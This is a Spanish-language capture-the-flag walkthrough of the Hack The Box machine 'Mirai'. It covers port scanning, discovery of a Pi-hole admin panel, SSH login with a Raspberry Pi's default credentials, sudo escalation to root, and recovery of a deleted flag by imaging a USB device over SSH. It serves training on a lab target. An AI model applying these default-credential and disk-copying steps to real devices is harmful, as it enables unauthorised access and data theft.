---
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Mirai

`Mirai` demuestra uno de los vectores de ataque de más rápido crecimiento en los tiempos modernos: dispositivos IoT configurados incorrectamente. Este vector de ataque está en constante aumento a medida que se crean e implementan cada vez más dispositivos IoT en todo el mundo, y está siendo explotado activamente por una amplia variedad de botnets. Los dispositivos IoT internos también están siendo utilizados para la persistencia a largo plazo por actores maliciosos.

<figure><img src="../../.gitbook/assets/Mirai.png" alt="" width="563"><figcaption></figcaption></figure>

***

## Reconnaissance

Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **Mirai**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.

```bash
❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.10.48 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-14 17:05 CET
Initiating SYN Stealth Scan at 17:05
Scanning 10.10.10.48 [65535 ports]
Discovered open port 53/tcp on 10.10.10.48
Discovered open port 22/tcp on 10.10.10.48
Discovered open port 80/tcp on 10.10.10.48
Discovered open port 32469/tcp on 10.10.10.48
Discovered open port 1298/tcp on 10.10.10.48
Discovered open port 32400/tcp on 10.10.10.48
Completed SYN Stealth Scan at 17:05, 24.15s elapsed (65535 total ports)
Nmap scan report for 10.10.10.48
Host is up, received user-set (0.16s latency).
Scanned at 2025-02-14 17:05:35 CET for 24s
Not shown: 65529 closed tcp ports (reset)
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
53/tcp    open  domain  syn-ack ttl 63
80/tcp    open  http    syn-ack ttl 63
1298/tcp  open  lpcp    syn-ack ttl 63
32400/tcp open  plex    syn-ack ttl 63
32469/tcp open  unknown syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 24.27 seconds
           Raw packets sent: 70906 (3.120MB) | Rcvd: 70899 (2.837MB)
```

A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.

```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.10.48
	[*] Open ports: 22,53,80,1298,32400,32469

[*] Ports copied to clipboard
```

Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado, comprobamos que se encuentran abiertos los siguientes servicios.

```bash
❯ nmap -sCV -p22,53,80,1298,32400,32469 10.10.10.48 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-14 17:08 CET
Nmap scan report for 10.10.10.48
Host is up (0.073s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey: 
|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)
|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)
|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)
|_  256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519)
53/tcp    open  domain  dnsmasq 2.76
| dns-nsid: 
|_  bind.version: dnsmasq-2.76
80/tcp    open  http    lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
1298/tcp  open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
32400/tcp open  http    Plex Media Server httpd
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
|_http-title: Unauthorized
|_http-cors: HEAD GET POST PUT DELETE OPTIONS
|_http-favicon: Plex
32469/tcp open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   96.26 ms 10.10.16.1
2   44.54 ms 10.10.10.48

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.10 seconds
```

Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.

```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.

<figure><img src="../../.gitbook/assets/imagen (350).png" alt=""><figcaption></figcaption></figure>

## Web Enumeration

Realizaremos una comprobación de las tecnologías que utilizas los sitios web.

```bash
❯ whatweb http://10.10.10.48
http://10.10.10.48 [404 Not Found] Country[RESERVED][ZZ], HTTPServer[lighttpd/1.4.35], IP[10.10.10.48], UncommonHeaders[x-pi-hole], lighttpd[1.4.35]

❯ whatweb http://10.10.10.48:32400
http://10.10.10.48:32400 [401 Unauthorized] Country[RESERVED][ZZ], IP[10.10.10.48], Script, Title[Unauthorized], UncommonHeaders[x-plex-protocol,x-plex-content-original-length,x-plex-content-compressed-length]
```

Accederemos a [http://10.10.10.48](http://10.10.10.48) y [http://10.10.10.48:32400](http://10.10.10.48:32400) y nos encontramos con los siguientes resultados.

{% hint style="info" %}
En [http://10.10.10.48:32400](http://10.10.10.48:32400) no logramos encontrar ningún tipo de información o vulnerabilidad para ganar acceso al sistema.
{% endhint %}

<figure><img src="../../.gitbook/assets/4936_vmware_nDtMhZlvAG (1).png" alt=""><figcaption></figcaption></figure>

Realizaremos una enumeración de directorios y páginas web a través de `dirsearch` en el cual obtuvimos el siguiente resultado.

```bash
❯ dirsearch -u 'http://10.10.10.48/' -t 50 -i 200 2>/dev/null

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460

Output File: /home/kali/Desktop/HackTheBox/Linux/Mirai/Mirai/reports/http_10.10.10.48/__25-02-14_17-17-45.txt

Target: http://10.10.10.48/

[17:17:45] Starting: 
[17:17:54] 200 -   14KB - /admin/
[17:17:54] 200 -   14KB - /admin/index.php

Task Completed
```

Al volver a realizar la enumeración sobre el directorio `/admin`, logramos encontrar más información que nos puede servir.

```bash
❯ dirsearch -u 'http://10.10.10.48/admin' -t 50 -i 200 2>/dev/null

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460

Output File: /home/kali/Desktop/HackTheBox/Linux/Mirai/Mirai/reports/http_10.10.10.48/_admin_25-02-14_17-19-28.txt

Target: http://10.10.10.48/

[17:19:28] Starting: admin/
[17:19:31] 200 -  274B  - /admin/.git/config
[17:19:31] 200 -   23B  - /admin/.git/HEAD
[17:19:31] 200 -   73B  - /admin/.git/description
[17:19:31] 200 -   11KB - /admin/.git/index
[17:19:31] 200 -  182B  - /admin/.git/logs/refs/heads/master
[17:19:31] 200 -  182B  - /admin/.git/logs/refs/remotes/origin/HEAD
[17:19:31] 200 -  240B  - /admin/.git/info/exclude
[17:19:31] 200 -  182B  - /admin/.git/logs/HEAD
```

Accederemos a http://10.10.10.48 y nos encontramos que se trata de una interfaz administrativa de `Pi-hole`.

{% hint style="info" %}
Pi-Hole es una aplicación diseñada para funcionar en placas Raspberry Pi o similares y que actúa como servidor DNS (Domain Name Space) y opcionalmente como servidor DHCP también.
{% endhint %}

<figure><img src="../../.gitbook/assets/imagen (351).png" alt=""><figcaption></figcaption></figure>

## Initial Access

### Access SSH with default Raspberry credentials

Una vez identificado que la máquina probablemente sea una `Raspberry`, el siguiente paso fue averiguar si el equipo tenía configurada las credenciales por defecto.

<figure><img src="../../.gitbook/assets/imagen (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

Al intentar acceder, verificamos que debido a una mala configuración, las credenciales no habían sido modificados, con lo cual conseguimos ganar acceso al sistema y visualizar la flag de **user.txt**.

```bash
❯ ssh pi@10.10.10.48
pi@10.10.10.48's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug 27 14:47:50 2017 from localhost

SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.


SSH is enabled and the default password for the 'pi' user has not been changed.
This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

pi@raspberrypi:~$ cat Desktop/user.txt 
ff8377074***********************
```

## Privilege Escalation

### Abusing sudoers privilege

Verificamos los privilegios `sudoers` que dispone el usuario`pi`. Logramos comprobar que podemos convertirnos en usuario `root` proporcionado las credenciales del usuario actual.

Al intentar visualizar la flag de **root.txt**, se nos muestra un mensaje indicando que ha perdido el archivo `root.txt` original, y que probablemente disponga de una copia de seguridad del archivo en el `USB`.

```bash
pi@raspberrypi:~$ sudo -l
Matching Defaults entries for pi on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pi may run the following commands on localhost:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
pi@raspberrypi:~$ sudo su
root@raspberrypi:/home/pi$ cd /root/
root@raspberrypi:~$ ls -l
total 4
-rw-r--r-- 1 root root 76 Aug 14  2017 root.txt
root@raspberrypi:~$ cat root.txt 
I lost my original root.txt! I think I may have a backup on my USB stick...
```

### Retrieving root.txt flag deleted

El usuario indica que dispone de un USB conectado al equipo, revisando los directorios de la raíz, logramos visualizar el directorio `media` en el cual probablemente se encuentre este USB montado.

```bash
root@raspberrypi:/# ls -l
total 64
drwxr-xr-x   2 root root  4096 Aug 13  2017 bin
drwxr-xr-x   2 root root  4096 Aug 13  2017 boot
drwxr-xr-x  17 root root  3280 Feb 14 16:03 dev
drwxr-xr-x 170 root root  4096 Dec 24  2017 etc
drwxr-xr-x   4 root root  4096 Aug 13  2017 home
lrwxrwxrwx   1 root root    33 Dec 13  2016 initrd.img -> /boot/initrd.img-3.16.0-4-686-pae
lrwxrwxrwx   1 root root    29 Dec 13  2016 initrd.img.old -> /boot/initrd.img-3.16.0-4-586
drwxr-xr-x  28 root root  4096 Aug 13  2017 lib
drwx------   2 root root 16384 Aug 13  2017 lost+found
drwxr-xr-x   3 root root  4096 Aug 14  2017 media
```

Al revisar los archivos del directorio `/media`, logramos visualizar un directorio llamado `usbstick` el cual contiene un archivo `damnit.txt` indicando que se ha eliminado accidentalmente el contenido del USB.

```bash
root@raspberrypi:/media$ ls -l
total 1
drwxr-xr-x 3 root root 1024 Aug 14  2017 usbstick

root@raspberrypi:/media$ cd usbstick/

root@raspberrypi:/media/usbstick$ ls -l
total 13
-rw-r--r-- 1 root root   129 Aug 14  2017 damnit.txt
drwx------ 2 root root 12288 Aug 14  2017 lost+found
root@raspberrypi:/media/usbstick$ cat damnit.txt 
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?

-James
```

Para recuperar la flag, realizamos un escaneo directo del dispositivo de almacenamiento en busca de cadenas de 32 caracteres hexadecimales, ya que las flags en HTB siguen este formato. Finalmente logramos encontrar el contenido de la flag de **root.txt**.

* **-a**: Trata el archivo binario como texto.
* **-P**: Usa expresiones regulares avanzadas.
* **-o**: Muestra solo las coincidencias.
* **'\[a-fA-F0-9]{32}'**: Busca cadenas de 32 caracteres hexadecimales.
* **/dev/sdb**: Dispositivo USB donde pudo estar almacenada la flag.

```bash
root@raspberrypi:/media/usbstick$ grep -aPo '[a-fA-F0-9]{32}' /dev/sdb
3d3e48314***********************
```

Al descubrir que la flag de `root.txt` había sido eliminada, optamos por realizar un volcado forense del dispositivo `/dev/sdb` para analizar su contenido en busca de datos recuperables. Para ello, utilizamos `dd` junto con `gzip` para transferir y comprimir la imagen del disco a nuestra máquina de ataque:

* **ssh pi@10.10.10.48**: Nos conectamos a la máquina objetivo.
* **sudo dd if=/dev/sdb**: Extraemos el contenido de la unidad USB (`/dev/sdb`).
* \| **gzip -1 -**: Comprimimos los datos en tiempo real para agilizar la transferencia.
* **| dd of=usb.gz**: Guardamos la imagen comprimida en nuestra máquina atacante.

```bash
❯ ssh pi@10.10.10.48 "sudo dd if=/dev/sdb | gzip -1 -" | dd of=usb.gz
pi@10.10.10.48's password: 
20480+0 records in
20480+0 records out
10485760 bytes (10 MB) copied, 0.121098 s, 86.6 MB/s
93+1 records in
93+1 records out
48103 bytes (48 kB, 47 KiB) copied, 4,93366 s, 9,7 kB/s

❯ ls -l usb.gz
.rw-rw-r-- kali kali 47 KB Fri Feb 14 17:31:35 2025  usb.gz

❯ file usb.gz
usb.gz: gzip compressed data, last modified: Fri Feb 14 16:32:13 2025, max speed, from Unix, original size modulo 2^32 10485760
```

Descomprimiremos la imagen a través del siguiente comando.

```bash
❯ gunzip usb.gz

❯ ls -l
.rw-rw-r-- kali kali  10 MB Fri Feb 14 17:31:35 2025  usb
```

Una vez extraída, analizamos su contenido con `strings`, entre los resultados, encontramos referencias a **root.txt** y una cadena en formato hexadecimal de 32 caracteres, lo que indica que la flag aún estaba en el disco. Este método nos permitió recuperar la flag eliminada sin necesidad de herramientas adicionales.

```bash
❯ strings usb
>r &
/media/usbstick
lost+found
root.txt
damnit.txt
>r &
>r &
/media/usbstick
lost+found
root.txt
damnit.txt
>r &
/media/usbstick
2]8^
lost+found
root.txt
damnit.txt
>r &
3d3e483143f*********************
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?
-James
```
